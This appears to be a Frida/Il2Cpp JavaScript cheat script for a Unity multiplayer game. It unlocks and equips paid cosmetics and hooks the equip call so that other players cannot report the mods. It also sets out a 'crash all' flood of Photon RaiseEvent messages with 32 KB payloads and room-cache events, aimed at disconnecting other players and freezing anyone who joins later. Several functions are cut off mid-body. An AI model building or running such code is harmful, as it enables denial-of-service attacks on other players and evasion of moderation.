        if (add) {
            if (_mAdd === undefined) {
                try { _mAdd = GameObject.method("AddComponent").overload("System.Type"); }
                catch (_) { _mAdd = null; }
            }
            return _mAdd;
        }
        if (_mGet === undefined) {
            try { _mGet = GameObject.method("GetComponent").overload("System.Type"); }
            catch (_) { _mGet = null; }
        }
        return _mGet;
    }
    function addComponent(obj, type) {
        const m = _compMethod(true);
        if (m) { try { return m.bind(obj).invoke(_typeObj(type)); }
                 catch (e) { ARC.warnOnce("addComponent", "AddComponent(Type) failed, using generic: " + e); } }
        return obj.method("AddComponent", 1).inflate(type).invoke();
    }
    function getTransform(obj) { return obj.method("get_transform").invoke(); }
    // Raw payload pointer for a managed array. See note above: the bridge's
    // .elements is garbage on this build, so every bulk read/write uses this.

    // ===================== ARC DIAGNOSTIC LOGGER =========================
    // ARC.step() prints BEFORE the risky call, so on a hard native crash the
    // final line in the log names the operation that died. Set ARC.verbose
    // to false to quieten the per-phase build trace.
    const ARC = {
        // OFF by default. Every step() is a console.log, and each one is an
        // RPC message to the host over USB -- with ~100 of them per build that
        // overhead DOMINATED the "done in NNNms" figures in the first trace
        // run. Build totals, clicks, errors and perf still log. Flip to true
        // only when hunting a crash, and read the timings as inflated.
        verbose: true,
        lastStep: "(none)",
        buildNo: 0,
        _t0: 0,
        _frames: 0,
        _tickMs: 0,
        _tickMax: 0,
        _seen: new Set(),

        step(s) {
            this.lastStep = s;
            if (this.verbose) console.log("[trace] " + s);
        },
        err(where, e) {
            console.error("[ERR] " + where + ": " + e + (e && e.stack ? "\n      " + String(e.stack).split("\n")[1] : ""));
        },
        warnOnce(key, msg) {
            if (this._seen.has(key)) return;
            this._seen.add(key);
            console.warn("[warn] " + msg);
        },
        buildStart() {
            this.buildNo++;
            this._t0 = Date.now();
            console.log("[build #" + this.buildNo + "] start  cat=" + currentCategory + " page=" + currentPage);
        },
        buildEnd(objects) {
            console.log("[build #" + this.buildNo + "] done in " + (Date.now() - this._t0) +
                        "ms  objects=" + objects + "  lastStep=" + this.lastStep);
        },
        // Per-frame cost. Reported as a rolling summary so it never floods.
        frame(ms) {
            this._frames++;
            this._tickMs += ms;
            if (ms > this._tickMax) this._tickMax = ms;
            if (this._frames >= 300) {
                console.log("[perf] " + this._frames + " frames  avg " +
                            (this._tickMs / this._frames).toFixed(2) + "ms  peak " +
                            this._tickMax.toFixed(1) + "ms  menu=" + (templateMenuOpen ? "open" : "closed"));
                this._frames = 0; this._tickMs = 0; this._tickMax = 0;
            }
        }
    };
    // ======================================================================
    function arrData(a) { return a.handle.add(Process.pointerSize * 4); }

    // Reference-type array element. Il2Cpp.Array.get() routes through the
    // bridge's broken elements pointer on this build, so read the slot direct.
    // Value-type array element (inline struct, not a pointer).
    let _hitStride = 0;
    function arrStruct(a, i, klass) {
        try {
            if (!_hitStride) _hitStride = klass.arrayElementSize;
            if (!_hitStride) return null;
            return new Il2Cpp.ValueType(arrData(a).add(i * _hitStride), klass.type);
        } catch (_) { return null; }
    }

    function PVRMInstance() {

        if (!_pvrmInst) { try { const v = cls.field("Instance").value; if (unityAlive(v)) { _pvrmInst = v; srcName = "static field"; } } catch (_) { } }
        if (!_pvrmInst) {

    function setRigColour(r, g, b, a = 1.0) {
        const cls = PVRM();
        if (!cls) return false;
        const forms = [
            ["static (Color rgba)", () => cls.method("SetColour").invoke([r, g, b, a])],
            ["static (Color rgb)", () => cls.method("SetColour").invoke([r, g, b])],
            ["static arity1", () => cls.method("SetColour", 1).invoke([r, g, b, a])],
            ["static arity3 floats", () => cls.method("SetColour", 3).invoke(r, g, b)],
            ["static arity4 floats", () => cls.method("SetColour", 4).invoke(r, g, b, a)]
        ];
        let last = null;
        for (const [label, call] of forms) {
            try {
                call();
                if (!_colourFormLogged) { _colourFormLogged = true; console.log("[mods] SetColour working form: " + label); }
                return true;
            } catch (e) { last = e; }
        }
        const bound = PVRMInstance();
        if (bound) {
            try {
                cls.method("SetColour").bind(bound).invoke([r, g, b, a]);
                if (!_colourFormLogged) { _colourFormLogged = true; console.log("[mods] SetColour working form: bound (Color rgba)"); }
                return true;
            } catch (e) { last = e; }
        }
        ARC.warnOnce("setcolour", "SetColour failed on every call form: " + last);
        return false;
    }

    // ii's randomstring(): 0-9 chars of A-Z0-9, with their fixed 0-length fallback.
    function randomNameString() {
        const length = Math.floor(Math.random() * 10);
        if (length === 0) return "OZJFZJF";
        const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        let out = "";
        for (let i = 0; i < length; i++) out += chars.charAt(Math.floor(Math.random() * chars.length));
        return out;
    }

    // ---- Cosmetics -------------------------------------------------------
    // UnlockCosmetic is trigger-driven: unlockButton / cosmeticUnlock /
    // collectiableName + OnTriggerEnter(Collider). Handing it the player's own
    // collider is exactly what walking into it does. UnlockCosmetic1 is a decoy
    // (no fields, method addresses stepping by 4 -- stub thunks).
    function _playerTriggerCollider() {
        const tried = [];
        for (const [label, cand] of [["bodyCollider", bodyCollider], ["headCollider", headCollider]]) {
            try {
                if (!unityAlive(cand)) { tried.push(label + "=dead"); continue; }
                const c = getComponent(cand, Collider);
                if (unityAlive(c)) { console.log("[cos] collider <- " + label + " (GetComponent)"); return c; }
                console.log("[cos] collider <- " + label + " (object itself)");
                return cand;
            } catch (e) { tried.push(label + "=ERR(" + e + ")"); }
        }
        console.warn("[cos] NO player collider: " + tried.join(", "));
        return null;
    }
    // Locked cosmetics are often INACTIVE, and the 1-arg FindObjectsOfType skips
    // those, so prefer the includeInactive overload when the build has it.
    function _findAllOfType(cls, label = "?", quiet = false) {
        try {
            const a = Object.method("FindObjectsOfType", 2).invoke(cls.type.object, true);
            // An EMPTY array is still non-null, so returning here short-circuited
            // the 1-arg fallback and reported 0 without ever trying it.
            if (a && !a.isNull?.() && a.length > 0) {
                if (!quiet) console.log("[cos] " + label + ": includeInactive overload -> " + a.length);
                return a;
            }
            if (!quiet) console.log("[cos] " + label + ": includeInactive gave " +
                        (a && !a.isNull?.() ? "0 results" : "nothing") + ", trying 1-arg");
        } catch (e) { if (!quiet) console.log("[cos] " + label + ": includeInactive unavailable (" + e + ")"); }
        try {
            const a = Object.method("FindObjectsOfType", 1).invoke(cls.type.object);
            if (!quiet) console.log("[cos] " + label + ": 1-arg overload -> " + (a && !a.isNull?.() ? a.length : "null"));
            return a;
        }
        catch (e) { console.warn("[cos] " + label + ": FindObjectsOfType FAILED: " + e); return null; }
    }
    // The 68 Change*Cosmetic components each hold one cosmetic ID as a plain
    // string field. That is the only place these IDs exist -- a type dump has no
    // string constants -- so harvest them live.
    function _harvestCosmeticIds() {
        const out = [], seen = new Set();
        const SRC = [
            ["ChangeHeadCosmetic", "Head"], ["ChangeFaceCosmetic", "Face"],
            ["ChangeLeftCosmetic", "Left"], ["ChangeRightCosmetic", "Right"],
            ["changebodycosmetic", "Body"]
        ];
        for (const [cname, field] of SRC) {
            const cls = _classOrNull(cname);
            if (!cls) continue;
            const all = _findAllOfType(cls, cname);
            if (!all || all.isNull?.()) continue;
            for (let i = 0; i < all.length; i++) {
                const c = arrObj(all, i);
                if (!c) continue;
                try {
                    const v = (c.field(field).value?.content || "").toString();
                    if (v && !seen.has(field + "|" + v)) { seen.add(field + "|" + v); out.push([field, v]); }
                } catch (_) { }
            }
        }
        return out;
    }
    // CosmeticEquiperComponent.Equip(String, CancellationToken) is the real call.
    // The token is a struct, and how the bridge marshals a default one varies, so
    // try each plausible shape and report which lands instead of guessing.
    let _equipFormLogged = false;
    function _equipCosmeticId(id) {
        const cls = _classOrNull("BigScary.Cosmetics.CosmeticEquiperComponent");
        if (!cls) { console.warn("[cos] CosmeticEquiperComponent missing"); return false; }
        // There is ONE equipper per player rig. Equipping on all of them is why
        // the cosmetic appeared on everybody on your screen. Resolve the LOCAL
        // one via PhotonCosmeticUpdaterComponent, which pairs an equipper
        // (JLKGMIPPJNH) with its owning Photon player (FOHDLLBADHO).
        let all = null;
        // Strategy 1: PhotonView.IsMine on the updater's own GameObject. This is
        // the authoritative "is this my rig" test; matching the Player object
        // directly failed on all 13 updaters.
        try {
            const upd = _classOrNull("PhotonCosmeticUpdaterComponent");
            let pv = null;
            for (const asm of ["PhotonUnityNetworking", "Assembly-CSharp"]) {
                try { pv = Il2Cpp.domain.assembly(asm).image.class("Photon.Pun.PhotonView"); if (pv) break; } catch (_) { }
            }
            if (upd && pv) {
                const list = _findAllOfType(upd, "PhotonCosmeticUpdaterComponent");
                if (list && !list.isNull?.()) {
                    for (let i = 0; i < list.length; i++) {
                        const u = arrObj(list, i);
                        if (!u) continue;
                        let mine = false;
                        try {
                            const go = u.method("get_gameObject").invoke();
                            let view = null;
                            try { view = getComponent(go, pv); } catch (_) { }
                            if (!unityAlive(view)) { try { view = go.method("GetComponentInParent", 1).inflate(pv).invoke(); } catch (_) { } }
                            if (unityAlive(view)) mine = !!view.method("get_IsMine").invoke();
                        } catch (_) { }
                        if (!mine) continue;
                        try {
                            const eq = u.field("DOHDLNHEAFI").value;
                            if (unityAlive(eq)) {
                                console.log("[cos] local equipper via PhotonView.IsMine (updater #" + i + ")");
                                all = [eq];
                                break;
                            }
                        } catch (_) { }
                    }
                }
            }
        } catch (e) { console.warn("[cos] IsMine lookup failed: " + e); }
        // Strategy 2: the equipper living under the local rig we already resolved.
        if (!all) {
            try {
                for (const root of [GTPlayer, bodyCollider, headCollider]) {
                    if (!unityAlive(root)) continue;
                    let go = root;
                    try { go = root.method("get_gameObject").invoke(); } catch (_) { }
                    let eq = null;
                    try { eq = go.method("GetComponentInParent", 1).inflate(cls).invoke(); } catch (_) { }
                    if (!unityAlive(eq)) { try { eq = go.method("GetComponentInChildren", 1).inflate(cls).invoke(); } catch (_) { } }
                    if (unityAlive(eq)) {
                        console.log("[cos] local equipper via local rig hierarchy");
                        all = [eq];
                        break;
                    }
                }
            } catch (e) { console.warn("[cos] rig-hierarchy lookup failed: " + e); }
        }
        if (!all) {
            console.warn("[cos] could not identify the LOCAL equipper; refusing to equip on every rig");
            return false;
        }
        let ctZero = null;
        try {
            const ctCls = Il2Cpp.domain.assembly("mscorlib").image.class("System.Threading.CancellationToken");
            ctZero = ctCls.alloc();
            try { ctZero = ctZero.unbox(); } catch (_) { }
        } catch (_) { }
        let ok = false, last = null;
        for (let i = 0; i < all.length; i++) {
            // `all` is now a plain JS array holding just the local equipper, so
            // arrObj (which reads an il2cpp array payload) must not be used here.
            const eq = Array.isArray(all) ? all[i] : arrObj(all, i);
            if (!eq) continue;
            const forms = [
                ["Equip(str, ctZero)", () => eq.method("Equip", 2).invoke(Il2Cpp.string(id), ctZero)],
                ["Equip(str, NULL)", () => eq.method("Equip", 2).invoke(Il2Cpp.string(id), NULL)],
                ["Equip(str, 0)", () => eq.method("Equip", 2).invoke(Il2Cpp.string(id), 0)],
                ["Equip(str)", () => eq.method("Equip", 1).invoke(Il2Cpp.string(id))]
            ];
            for (const [label, call] of forms) {
                try {
                    call();
                    if (!_equipFormLogged) { _equipFormLogged = true; console.log("[cos] Equip working form: " + label); }
                    ok = true;
                    break;
                } catch (e) { last = e; }
            }
        }
        if (!ok) console.warn("[cos] Equip failed on every form: " + last);
        return ok;
    }
    // "ToString failed" means the property value is NOT a System.String -- most
    // likely byte[] or a serialized type. Report the runtime type first, then
    // decode according to what it actually is.
    function _describeVal(v) {
        if (!v || v.isNull?.()) return "(null)";
        let t = "?";
        try { t = v.class.type.name; } catch (_) { try { t = v.class.name; } catch (_) { } }
        let extra = "";
        try {
            if (t.indexOf("System.String") >= 0) {
                // get_Item is declared to return System.Object, so the bridge
                // hands back an Il2Cpp.Object with no .content accessor even
                // though the runtime type IS a string -- hence "undefined".
                // Re-wrap it, and fall back to the raw il2cpp string layout
                // (0x10 = int32 length, 0x14 = UTF-16 chars) if that fails.
                let s;
                try { s = new Il2Cpp.String(v.handle).content; } catch (_) { }
                if (s === undefined || s === null) {
                    try {
                        const len = v.handle.add(0x10).readS32();
                        s = v.handle.add(0x14).readUtf16String(len);
                    } catch (e) { s = "<raw read failed " + e + ">"; }
                }
                extra = JSON.stringify(s);
            } else if (t.indexOf("[]") >= 0) {
                const n = v.length;
                const bytes = [];
                for (let i = 0; i < Math.min(n, 64); i++) {
                    try { bytes.push(v.get(i)); } catch (_) { break; }
                }
                // Bytes often decode straight to readable ASCII.
                let ascii = "";
                for (const b of bytes) {
                    const c = Number(b) & 0xff;
                    ascii += (c >= 32 && c < 127) ? String.fromCharCode(c) : ".";
                }
                extra = "len=" + n + " bytes=[" + bytes.join(",") + "] ascii=\"" + ascii + "\"";
            } else {
                try { extra = "ToString=" + (v.method("ToString", 0).invoke()?.content ?? "?"); } catch (_) { }
                try {
                    const names = [];
                    for (const f of v.class.fields) { if (!f.isStatic) names.push(f.type.name + " " + f.name); }
                    if (names.length) extra += " fields{" + names.slice(0, 10).join(" | ") + "}";
                } catch (_) { }
            }
        } catch (e) { extra = "describe error " + e; }
        return t + " :: " + extra;
    }
    // The "Cosmetics" player property is JSON keyed by BIDBHMCCOCH enum NAMES:
    //   {"HEAD":"year3","FACE":"cum15","FUR":"rare18","BADGE":"..."}
    function _il2cppStr(v) {
        if (!v || v.isNull?.()) return null;
        try { const s = new Il2Cpp.String(v.handle).content; if (s != null) return s; } catch (_) { }
        try { return v.handle.add(0x14).readUtf16String(v.handle.add(0x10).readS32()); } catch (_) { return null; }
    }
    // The local PhotonCosmeticUpdaterComponent, found via PhotonView.IsMine.
    function _localCosmeticUpdater() {
        try {
            const upd = _classOrNull("PhotonCosmeticUpdaterComponent");
            let pv = null;
            for (const asm of ["PhotonUnityNetworking", "Assembly-CSharp"]) {
                try { pv = Il2Cpp.domain.assembly(asm).image.class("Photon.Pun.PhotonView"); if (pv) break; } catch (_) { }
            }
            if (!upd || !pv) return null;
            const list = _findAllOfType(upd, "PhotonCosmeticUpdaterComponent");
            if (!list || list.isNull?.()) return null;
            for (let i = 0; i < list.length; i++) {
                const u = arrObj(list, i);
                if (!u) continue;
                try {
                    const go = u.method("get_gameObject").invoke();
                    let view = null;
                    try { view = getComponent(go, pv); } catch (_) { }
                    if (!unityAlive(view)) { try { view = go.method("GetComponentInParent", 1).inflate(pv).invoke(); } catch (_) { } }
                    if (unityAlive(view) && view.method("get_IsMine").invoke()) return u;
                } catch (_) { }
            }
        } catch (e) { console.warn("[cos] local updater lookup: " + e); }
        return null;
    }
    // Writing the Photon property from outside loses a race: the game's own
    // debounced publisher rewrites it from DGBCODLKEOP (its internal slot->id
    // dictionary) moments later, which is why FACE:cum15 vanished. Put the entry
    // INTO that dictionary so the game republishes it for us.
    // 1384 added LAUNCHER (12) + ROCKETLAUNCHER (13) between RAILGUN and BADGE,
    // bumping BADGE from 12 to 14. Writing to the old 12 now sets a launcher
    // cosmetic instead of a badge, which is why Give-All visually missed the
    // badge slot and silently replaced a weapon slot.
    const BIDBHMCCOCH_SLOTS = {
        HEAD: 0, FACE: 1, BODY: 2, RIGHT_HAND: 3, LEFT_HAND: 4, FUR: 5,
        BACKPACK: 6, BTM_BODY: 7, REVOLVER: 8, SHOTGUN: 9, RIFLE: 10,

    // Rig SS redirect state. When _rigRedirectActive is true, cosmetic writes
    // go to the spawned rigs' updaters instead of the local player, so the
    // local avatar stays clean (reporters cannot see mod hats on us).
    let _rigRedirectActive = false;
    let _rigSSSpawnedRigs = [];           // il2cpp GameObject refs
    let _rigSSRoomToken = null;            // room token at time of last spawn
    let _rigSSTopUpNext = 0;               // next time the toggle's caretaker runs
    const RIG_SS_TARGET_COUNT = 10;
    // Report-me-hat bypass: hook CosmeticEquiperComponent.Equip and if the
    // callee is OUR local equipper, immediately UnequipAll so our real player
    // stays bald. Other rigs' equips pass through untouched.
    let _rigSSEquipHookHandles = [];       // Interceptor listeners to detach on toggle off
    let _rigSSLocalEqPtr = null;           // address of local equipper for `this`-match
    let _rigSSLocalEqRecheckAt = 0;         // next time we re-resolve local equipper (room/rig change)
    function _rigSSResolveLocalEquipper() {
        try {
            const u = _localCosmeticUpdater();
            if (!u) return null;
            const eq = u.field("DOHDLNHEAFI").value;
            if (!eq || eq.isNull?.()) return null;
            return eq.handle;
        } catch (_) { return null; }
    }
    function _rigSSInstallEquipHooks() {
        if (_rigSSEquipHookHandles.length) return true;
        try {
            const eqCls = _classOrNull("CosmeticEquiperComponent");
            if (!eqCls) { console.warn("[rigSS] no CosmeticEquiperComponent"); return false; }
            // Build the CancellationToken value we pass to UnequipAll.
            let ctZero = null;
            try {
                const ctCls = Il2Cpp.corlib.class("System.Threading.CancellationToken");
                const boxed = ctCls.alloc();
                try { boxed.method(".ctor", 0).invoke(); } catch (_) { }
                try { ctZero = boxed.unbox(); } catch (_) { ctZero = boxed; }
            } catch (_) { }
            const seen = new Set();
            // Hook every "Equip" overload the class exposes (string, CosmeticSO).
            const overloads = ["Equip"];
            for (const name of overloads) {
                let methods = [];
                try { methods = eqCls.methods.filter(m => m.name === name); } catch (_) { }
                for (const m of methods) {
                    if (seen.has(String(m.virtualAddress))) continue;
                    seen.add(String(m.virtualAddress));
                    try {
                        const h = Interceptor.attach(m.virtualAddress, {
                            onEnter(args) { this.selfPtr = args[0]; },
                            onLeave(_retval) {
                                if (!_rigRedirectActive) return;
                                try {
                                    // Lazy-resolve local equipper ptr; retry when
                                    // our updater instance changes (new room /
                                    // rig respawn).
                                    if (!_rigSSLocalEqPtr || time > _rigSSLocalEqRecheckAt) {
                                        _rigSSLocalEqRecheckAt = time + 2;
                                        _rigSSLocalEqPtr = _rigSSResolveLocalEquipper();
                                    }
                                    if (!_rigSSLocalEqPtr) return;
                                    if (!this.selfPtr || !this.selfPtr.equals(_rigSSLocalEqPtr)) return;
                                    // Local equipper: force-strip whatever Equip
                                    // just applied so our real avatar stays bald.
                                    try {
                                        const equipper = new Il2Cpp.Object(this.selfPtr);
                                        equipper.method("UnequipAll", 1).invoke(ctZero);
                                    } catch (e) { ARC.warnOnce("rigSS-unequip", "UnequipAll: " + e); }
                                } catch (_) { }
                            }
                        });
                        _rigSSEquipHookHandles.push(h);
                    } catch (e) { ARC.warnOnce("rigSS-attach", "attach Equip: " + e); }
                }
            }
            console.log("[rigSS] Equip hooks installed: " + _rigSSEquipHookHandles.length);
            return _rigSSEquipHookHandles.length > 0;
        } catch (e) { console.warn("[rigSS] install hooks: " + e); return false; }
    }
    function _rigSSRemoveEquipHooks() {
        for (const h of _rigSSEquipHookHandles) {
            try { h.detach(); } catch (_) { }
        }
        _rigSSEquipHookHandles = [];
        _rigSSLocalEqPtr = null;
    }
    // Crash All (RaiseEvent flood). Wireless's recipe: stress Photon's inbound

    let _crashAllNext = 0;

    // Shared throttle for the TRACKER_Location crash/freeze toggles (buttons

    let _trackerLastRun = 0;

    function _getCrashPayload() {
        if (_crashAllPayload) return _crashAllPayload;
        try {
            // 32 KB byte array is small enough that RaiseEvent itself does not
            // fail locally, but large enough to saturate recipients' queue.
            const byteCls = Il2Cpp.corlib.class("System.Byte");
            _crashAllPayload = Il2Cpp.array(byteCls, new Array(32 * 1024).fill(0xFF));
        } catch (e) { console.warn("[crash] payload alloc: " + e); }
        return _crashAllPayload;
    }
    // --- "crash all testy" — multi-vector burst from YOUR client ---------------
    // Sender model: OUR real PUN connection does all the sending (what you
    // asked for after the bot experiment). Every event carries an explicit
    // TargetActors[] = every actor EXCEPT ourselves, so the flood never comes
    // back at us. Photon's per-connection sender rate limits CAN still kick
    // you as the sender — self-eviction detection below halts and notifies.
    // Vectors per batch (all SendUnreliable, all WebFlags(0xFF)):
    //  A+B) GT recipe: event 54 x40 — the Gorilla Tag OpRaiseEvent-54 crash
    //       ported from FreezeServer(0.5f, 40), now victim-targeted.
    //  C)  Wireless recipe: event 1 x20 with a raw 31.5 KB byte[] — the proven
    //      Big Scary inbound-queue saturator (~25s to disconnect recipients).
    //  D)  15 events cycling codes 150-164 — Big Scary's OWN router only takes
    //      that range and dispatches it into game logic, so recipients pay the
    //      deserialize+handler cost instead of silently dropping unknown codes.
    //  E)  every 3rd burst: 5x event 1 with CachingOption = AddToRoomCacheGlobal
    //      (value 5, verified in dump.cs) — the server replays the blob to every
    //      FUTURE joiner: freezes joins and grows room state that never clears.
    // Tunables: _freezeDelay, the counts, and the padEnd/array sizes below.
    let _freezeNext = 0;
    let _freezeLogAt = 0;
    let _freezeBursts = 0;
    let _freezeBsIdx = 0;
    let _freezeNoVictimAt = 0;
    let _freezeStopped = false;
    let _freezeSelfWasInRoom = false;
    let _freezeHaltReason = "not started";
    let _freezeHaltShown = null;
    let _freezeTargetsKey = "";

    let _freezeCache = null;          // options/payloads, built once
    let _freezeDisconnectHook = null; // set once the permanent protection hooks are installed

    const _freezeDelay = 0.5;         // C#: delay  (FreezeServer(0.5f, ...))
    const _freezeRecipeCount = 20;    // vectors A and B each (40 event-54 total)
    const _freezeWirelessCount = 20;  // vector C per burst
    const _freezeBsCount = 15;        // vector D per burst (one full 150-164 sweep)
